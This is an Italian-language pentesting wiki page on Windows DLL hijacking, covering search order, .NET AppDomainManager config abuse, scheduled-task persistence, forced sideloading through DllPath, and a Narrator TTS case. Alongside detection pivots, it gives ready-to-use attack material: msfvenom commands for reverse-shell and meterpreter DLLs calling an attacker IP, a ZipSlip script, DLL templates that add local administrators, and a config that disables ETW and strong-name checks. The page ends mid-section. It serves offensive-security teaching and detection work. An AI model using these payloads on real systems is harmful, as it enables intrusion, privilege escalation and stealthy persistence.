# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione attendibile affinché carichi una DLL dannosa. Questo termine comprende diverse tattiche, come **DLL Spoofing, Injection e Side-Loading**. Viene utilizzato principalmente per l'esecuzione di codice e per ottenere persistenza e, più raramente, per l'escalation dei privilegi. Sebbene qui l'attenzione sia concentrata sull'escalation, il metodo di hijacking rimane coerente indipendentemente dall'obiettivo.

### Tecniche comuni

Per il DLL hijacking vengono utilizzati diversi metodi, la cui efficacia dipende dalla strategia di caricamento delle DLL adottata dall'applicazione:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: sostituire una DLL autentica con una dannosa, utilizzando facoltativamente il DLL Proxying per preservare le funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: collocare la DLL dannosa in un percorso di ricerca precedente rispetto a quello legittimo, sfruttando il modello di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: creare una DLL dannosa da far caricare all'applicazione, facendo credere che si tratti di una DLL richiesta ma inesistente.
4. **DLL Redirection**: modificare parametri di ricerca come `%PATH%` o i file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione verso la DLL dannosa.
5. **WinSxS DLL Replacement**: sostituire la DLL legittima con una controparte dannosa nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: collocare la DLL dannosa in una directory controllata dall'utente insieme all'applicazione copiata, in modo simile alle tecniche di Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Il classico DLL sideloading non è l'unico modo per fare in modo che un processo **.NET Framework** attendibile carichi codice controllato dall'attaccante. Se l'eseguibile target è un'applicazione **managed**, il CLR consulta anche un file di configurazione dell'applicazione denominato in base all'eseguibile (ad esempio `Setup.exe.config`). Questo file può definire un **AppDomainManager** personalizzato. Se la configurazione fa riferimento a un assembly controllato dall'attaccante e collocato accanto all'EXE, il CLR lo carica **prima del normale percorso di esecuzione dell'applicazione** e lo esegue all'interno del processo attendibile.<sup>[[24]](#references)</sup>

Secondo lo schema di configurazione di .NET Framework di Microsoft, sia `<appDomainManagerAssembly>` sia `<appDomainManagerType>` devono essere presenti affinché venga utilizzato il manager personalizzato.<sup>[[16]](#references)[[17]](#references)</sup>

Configurazione minima:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Manager minimale:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Note pratiche:
- Questa è una tecnica specifica di **.NET Framework**. Dipende dal parsing della configurazione del CLR, non dall'ordine di ricerca delle DLL Win32.
- L'host deve essere realmente un **EXE gestito**. Triage rapido: `sigcheck -m target.exe`, `corflags target.exe`, oppure verifica la presenza del **CLR Runtime Header** nei metadati PE.
- Il nome del file di configurazione deve corrispondere esattamente al nome dell'eseguibile (`<binary>.config`) e di solito si trova **accanto all'EXE**.
- È utile con binari **Microsoft/vendor firmati** perché l'EXE attendibile rimane intatto mentre l'assembly gestito malevolo viene eseguito in-process.
- Se disponi già di una directory di installazione/aggiornamento scrivibile, il dirottamento di AppDomainManager può essere usato come **first stage**, seguito dal classico DLL sideloading o dal reflective loading per gli stage successivi.

### AppDomainManager come downloader + bootstrap di scheduled task

Un pattern di intrusione pratico consiste nell'abbinare l'EXE gestito attendibile a un `*.config` malevolo e a una DLL AppDomainManager malevola che agisce esclusivamente come **bootstrapper di piccole dimensioni**:<sup>[[25]](#references)</sup>

1. L'utente avvia un installer o updater .NET firmato da una posizione plausibile come `%USERPROFILE%\Downloads`.
2. Il config adiacente induce il CLR a caricare l'assembly dell'attacker **prima** dell'avvio della logica legittima dell'applicazione.
3. Il manager malevolo esegue un **path gate** (ad esempio, continua solo se l'host EXE è in esecuzione da `Downloads` e consente l'esecuzione del second stage solo da `%LOCALAPPDATA%`).
4. Se il controllo ha esito positivo, scarica il payload reale in un percorso scrivibile dall'utente come `%LOCALAPPDATA%\PerfWatson2.exe` e instaura la persistence con un scheduled task.

Perché questa variante è importante:
- L'host EXE firmato rimane invariato, quindi un triage che calcola l'hash solo del binario principale potrebbe non rilevare la compromissione.
- La semplice **anti-analysis basata sul percorso** è comune: spostare la triade ZIP/EXE/DLL sul Desktop, in Temp o in un percorso sandbox può interrompere intenzionalmente la catena.
- La DLL AppDomainManager del first stage può rimanere piccola e con un basso livello di rumore, mentre l'impianto reale viene scaricato in seguito.

Esempio minimo di persistence frequentemente osservato con questo pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Note:
- ` /rl highest` significa **highest available** per quell'utente/sessione; da solo non garantisce un'escalation a SYSTEM.
- Questa tecnica è spesso classificata meglio come **execution/persistence via .NET config abuse** piuttosto che come il classico missing-DLL search-order hijacking, anche se gli operatori concatenano frequentemente entrambe.

Pivot di rilevamento:
- Eseguibili .NET firmati avviati da **ZIP extraction paths**, `Downloads`, `%TEMP%` o altre cartelle scrivibili dall'utente, con un `<exe>.config` **colocato**.
- Nuove attività pianificate la cui azione punta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads`, con nomi che imitano gli updater di browser/vendor.
- Processi bootstrap gestiti di breve durata che scaricano immediatamente un altro EXE e poi avviano `schtasks.exe`.
- Sample che terminano anticipatamente a meno che il percorso dell'eseguibile non corrisponda a una directory prevista del profilo utente.

### Hijacking di un'attività pianificata esistente per rilanciare la sideload chain

Per la persistenza, non limitarti a cercare la **creazione di una nuova attività**. Alcuni intrusion set attendono che un installer legittimo crei una **normale attività updater**, quindi **riscrivono l'azione dell'attività** in modo che il nome, l'autore e il trigger esistenti rimangano familiari ai difensori.

Workflow riutilizzabile:
1. Installa/avvia il software legittimo e identifica l'attività che normalmente crea.
2. Esporta l'XML dell'attività e annota i valori correnti di `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Sostituisci solo l'azione in modo che l'attività avvii il tuo **trusted host EXE** da una directory di staging scrivibile dall'utente, che eseguirà poi il sideload o il caricamento tramite AppDomain del payload reale.
4. Registra nuovamente lo stesso nome dell'attività invece di creare un nuovo e ovvio artefatto di persistenza.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Perché è più furtivo:
- Il nome dell'attività può comunque sembrare legittimo (ad esempio un updater del vendor).
- Il servizio **Task Scheduler** lo avvia, quindi la validazione del parent/ancestor spesso rileva la catena di scheduling prevista invece di `explorer.exe`.
- I team DFIR che cercano solo **nuovi nomi di attività** potrebbero non rilevare un'attività la cui registrazione esisteva già, ma la cui action ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o a un altro percorso controllato dall'attaccante.

Pivot rapidi per l'hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confrontare l'XML di `C:\Windows\System32\Tasks\*` e i metadati di `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Generare un alert quando un'attività updater dall'aspetto legittimo del **vendor** viene eseguita da **directory scrivibili dall'utente** o avvia un EXE .NET con un file `*.config` colocato.

> [!TIP]
> Per una catena passo-passo che combina HTML staging, configurazioni AES-CTR e impianti .NET con il DLL sideloading, consulta il workflow seguente.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Individuazione delle DLL mancanti

Il modo più comune per trovare le DLL mancanti all'interno di un sistema consiste nell'eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **2 filtri seguenti**:

![Tecniche comuni - Individuazione delle DLL mancanti: il modo più comune per trovare le DLL mancanti all'interno di un sistema consiste nell'eseguire procmon da sysinternals, impostando i 2 filtri seguenti](<../../../images/image (961).png>)

![Tecniche comuni - Individuazione delle DLL mancanti: il modo più comune per trovare le DLL mancanti all'interno di un sistema consiste nell'eseguire procmon da sysinternals, impostando i 2 filtri seguenti](<../../../images/image (230).png>)

e visualizzare solo la **File System Activity**:

![Tecniche comuni - Individuazione delle DLL mancanti: e visualizzare solo la File System Activity](<../../../images/image (153).png>)

Se stai cercando **DLL mancanti in generale**, **lascia** questa acquisizione in esecuzione per alcuni **secondi**.\
Se stai cercando una **DLL mancante all'interno di un eseguibile specifico**, imposta un altro filtro come **"Process Name" "contains" `<exec name>`**, eseguilo e interrompi l'acquisizione degli eventi.<sup>[[9]](#references)</sup>

## Sfruttamento delle DLL mancanti

Per eseguire un privilege escalation, cerca una **DLL che un processo privilegiato tenta di caricare** da una posizione in cui puoi scrivere. Questo può accadere quando controlli una directory cercata prima di quella contenente la DLL legittima, oppure quando la DLL richiesta non esiste e puoi scrivere in una delle directory cercate.

### Dll Search Order

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare informazioni dettagliate su come vengono caricate le DLL.**

Le **applicazioni Windows** cercano le DLL seguendo un insieme di **percorsi di ricerca predefiniti**, rispettando una sequenza specifica. Il problema del DLL hijacking si verifica quando una DLL dannosa viene posizionata strategicamente in una di queste directory, assicurandosi che venga caricata prima della DLL autentica. Una soluzione per impedirlo consiste nell'assicurarsi che l'applicazione utilizzi percorsi assoluti quando fa riferimento alle DLL necessarie.

Di seguito puoi vedere l'**ordine di ricerca delle DLL** sui sistemi **a 32 bit**:

1. La directory dalla quale è stata caricata l'applicazione.
2. La directory di sistema. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste alcuna funzione che restituisca il percorso di questa directory, ma viene comunque cercata. (_C:\Windows\System_)
4. La directory Windows. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile d'ambiente PATH. Nota che questo non include il percorso specifico dell'applicazione definito dalla chiave di registro **App Paths**. La chiave **App Paths** non viene utilizzata nel calcolo del percorso di ricerca delle DLL.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente passa al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (per impostazione predefinita è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, una DLL può essere caricata tramite percorso assoluto anziché tramite nome. In tal caso, Windows cerca la DLL stessa solo in quel percorso; le dipendenze richieste tramite nome seguono comunque l'ordine di ricerca applicabile.

Esistono altri modi per modificare l'ordine di ricerca, ma non li illustrerò qui.

### Concatenamento di una scrittura arbitraria di file in un hijack di una DLL mancante

1. Usa i filtri di **ProcMon** (`Process Name` = EXE target, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo cerca ma non trova.<sup>[[14]](#references)</sup>
2. Se il binario viene eseguito tramite uno **schedule/servizio**, il rilascio di una DLL con uno di questi nomi nella **directory dell'applicazione** (voce n. 1 dell'ordine di ricerca) farà sì che venga caricata alla successiva esecuzione. In un caso con uno scanner .NET, il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia reale da `C:\Program Files\dotnet\fxr\...`.
3. Crea una DLL payload (ad esempio una reverse shell) con una qualsiasi export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se la tua primitive è una **scrittura arbitraria in stile ZipSlip**, crea uno ZIP con un'entry che esca dalla directory di estrazione, in modo che la DLL venga collocata nella cartella dell'applicazione:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Consegna l'archivio alla inbox/share monitorata; quando l'attività pianificata riavvia il processo, questo carica la DLL malevola ed esegue il tuo codice con l'account del servizio.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un metodo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un processo appena creato consiste nell'impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS durante la creazione del processo con le API native di ntdll. Specificando qui una directory controllata dall'attaccante, un processo target che risolve una DLL importata tramite il nome (senza un percorso assoluto e senza utilizzare i flag di caricamento sicuro) può essere costretto a caricare una DLL malevola da quella directory.

Key idea
- Crea i parametri del processo con RtlCreateProcessParametersEx e fornisci un DllPath personalizzato che punti alla tua cartella controllata (ad esempio, la directory in cui si trovano il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL tramite il nome, il loader consulterà il DllPath fornito durante la risoluzione, consentendo un sideloading affidabile anche quando la DLL malevola non si trova nella stessa directory dell'EXE target.

Notes/limitations
- Questo influisce sul processo figlio in fase di creazione; è diverso da SetDllDirectory, che influisce solo sul processo corrente.
- Il target deve importare o eseguire LoadLibrary su una DLL tramite il nome (senza un percorso assoluto e senza utilizzare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e i percorsi assoluti hardcoded non possono essere hijacked. Gli export inoltrati e SxS possono modificare la precedenza.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Inserisci una xmllite.dll malevola (che esporti le funzioni richieste o faccia da proxy per quella reale) nella directory DllPath.
- Avvia un binary firmato noto per cercare xmllite.dll per nome utilizzando la tecnica descritta sopra. Il loader risolve l'import tramite il DllPath fornito ed esegue il sideload della tua DLL.

Questa tecnica è stata osservata in-the-wild per creare catene di sideloading multi-stage: un launcher iniziale rilascia una DLL helper, che avvia quindi un binary firmato da Microsoft e hijackable con un DllPath personalizzato per forzare il caricamento della DLL dell'attacker da una staging directory.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking tramite `.exe.config`

Per i target **.NET Framework**, il sideloading può essere eseguito **prima di `Main()`** senza patchare la memoria, abusando del file **`.exe.config`** adiacente dell'applicazione. Invece di basarsi soltanto sull'ordine di ricerca delle DLL Win32, l'attacker posiziona un EXE .NET legittimo accanto a un config malevolo e a uno o più assembly controllati dall'attacker.

Come funziona la chain:<sup>[[15]](#references)[[22]](#references)</sup>
1. L'host EXE viene avviato e il **CLR legge `<exe>.config`**.
2. Il config imposta **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`**, in modo che il runtime istanzi un `AppDomainManager` controllato dall'attacker.
3. Il manager malevolo ottiene l'**esecuzione pre-`Main()`** all'interno del processo host trusted.
4. Lo stesso config può forzare il CLR a risolvere prima gli assembly locali (ad esempio `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e può indebolire la validazione/telemetria del runtime senza inline patching.

Pattern in stile campagna (l'annidamento esatto può variare in base alla direttiva / versione del CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Perché è utile:
- **`<probing privatePath="."/>`** mantiene la risoluzione degli assembly nella directory dell'applicazione, trasformando la cartella in una superficie di sideloading prevedibile.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** spostano l'esecuzione nel codice dell'attacker durante l'inizializzazione del CLR, prima che venga eseguita la logica legittima dell'applicazione.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** può consentire a un'app full-trust di caricare assembly non firmati o manomessi senza un errore di convalida dello strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita i redirect delle publisher policy verso assembly più recenti.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rende più deterministica la selezione del runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** è particolarmente interessante perché il **CLR disabilita la propria visibilità ETW** dalla configurazione invece di applicare una patch a `EtwEventWrite` in memoria da parte dell'implant.

Pattern operativo osservato in campagne recenti:
- Lo Stage 1 rilascia `setup.exe`, `setup.exe.config` e gli assembly locali.
- Lo Stage 2 li copia in una credibile cartella di **AppData update**, rinomina l'host con un nome come `update.exe` e lo riavvia tramite un **scheduled task**.
- Lo Stage 3 verifica il contesto di esecuzione, ad esempio il parent previsto `svchost.exe` da Task Scheduler, prima di caricare la DLL/export finale del RAT.

Idee per l'hunting:
- **Eseguibili .NET** firmati o comunque legittimi in esecuzione con file **`.config`** adiacenti sospetti in posizioni scrivibili dall'utente.
- File `.config` contenenti **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Scheduled task che riavviano binari update rinominati da **`%LOCALAPPDATA%`** o da directory specifiche dell'app come `\bin\update\`.
- Catene parent/child in cui un scheduled task avvia un host .NET trusted che carica immediatamente assembly non appartenenti al vendor dalla propria directory.

#### Eccezioni all'ordine di ricerca delle DLL secondo la documentazione Windows

Nella documentazione Windows sono indicate alcune eccezioni all'ordine standard di ricerca delle DLL:

- Quando viene incontrata una **DLL che condivide il proprio nome con una già caricata in memoria**, il sistema ignora la ricerca abituale. Esegue invece un controllo per verificare la presenza di redirection e di un manifest, prima di usare la DLL già presente in memoria. **In questo scenario, il sistema non esegue una ricerca della DLL**.
- Nei casi in cui la DLL sia riconosciuta come una **known DLL** per la versione corrente di Windows, il sistema utilizzerà la propria versione della known DLL, insieme a tutte le DLL da cui dipende, **ignorando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di queste known DLL.
- Se una **DLL ha dipendenze**, la ricerca delle DLL dipendenti viene eseguita come se fossero indicate esclusivamente tramite i loro **module names**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale) e a cui **manca una DLL**.
- Assicurarsi che sia disponibile **accesso in scrittura** a qualsiasi **directory** in cui verrà **cercata la DLL**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory inclusa nel system path.

Questi prerequisiti non sono normalmente presenti: gli eseguibili privilegiati di solito non hanno dipendenze DLL mancanti e gli utenti standard normalmente non possono scrivere nelle directory del system search-path. Gli ambienti configurati in modo errato possono comunque esporre entrambe le condizioni.\
Se i requisiti sono soddisfatti, controlla il progetto [UACME](https://github.com/hfiref0x/UACME). Sebbene il suo obiettivo principale sia il bypass di UAC, contiene PoC di DLL-hijacking per versioni specifiche di Windows, che spesso possono essere adattati alla directory scrivibile individuata.

Nota che puoi **controllare i tuoi permessi in una cartella** eseguendo:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli import di un eseguibile e gli export di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare del DLL Hijacking per effettuare una privilege escalation** disponendo dei permessi di scrittura in una **cartella del System Path**, consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificherà se disponi dei permessi di scrittura su una qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatizzati interessanti per individuare questa vulnerabilità sono le **funzioni di PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Nel caso in cui trovi uno scenario sfruttabile, una delle cose più importanti per riuscire a sfruttarlo consiste nel **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. In ogni caso, nota che il DLL Hijacking è utile per [**effettuare una privilege escalation dal livello Medium Integrity al livello High (bypassando UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** all'interno di questo studio sul DLL hijacking, incentrato sul DLL hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll con funzioni non necessarie esportate**.

## **Creazione e compilazione di DLL**

### **DLL Proxifying**

Fondamentalmente, un **DLL proxy** è una DLL in grado di **eseguire il tuo codice malevolo quando viene caricata**, ma anche di **esporre** e **funzionare** come **previsto**, inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi **indicare un eseguibile e selezionare la libreria** che vuoi sottoporre a proxifying e **generare una dll proxificata**, oppure **indicare la DLL** e **generare una dll proxificata**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86, non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

In molti casi, la DLL compilata deve **esportare ogni funzione importata dal processo vittima**. Se manca un'esportazione necessaria, il binario non può risolverla e l'exploit fallisce.

<details>
<summary>Template DLL in C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione di un utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con entry point del thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: DLL Hijack della localizzazione TTS OneCore di Narrator (Accessibilità/ATs)

Windows Narrator.exe continua a cercare all'avvio una DLL di localizzazione prevedibile e specifica per la lingua, che può essere hijacked per l'esecuzione arbitraria di codice e la persistenza.<sup>[[7]](#references)</sup>

Fatti principali
- Percorso di ricerca (build attuali): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build meno recenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se nel percorso OneCore è presente una DLL controllata dall'attaccante e scrivibile, viene caricata ed esegue `DllMain(DLL_PROCESS_ATTACH)`. Non sono necessarie esportazioni.

Discovery con Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` oppure `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso indicato sopra.

DLL minima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silenzio OPSEC
